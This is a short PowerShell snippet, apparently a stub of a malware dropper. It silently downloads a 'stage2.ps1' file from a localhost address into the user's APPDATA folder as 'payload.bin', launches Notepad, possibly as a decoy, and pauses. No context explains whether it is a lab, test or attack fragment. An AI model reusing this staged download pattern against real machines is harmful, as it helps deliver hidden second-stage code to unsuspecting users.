curl.exe -s -L -o "$env:APPDATA\payload.bin" 'http://127.0.0.1/stage2.ps1'
Start-Process -FilePath "notepad.exe" -ErrorAction SilentlyContinue
$ProgressPreference = "SilentlyContinue"
Start-Sleep -Seconds 3
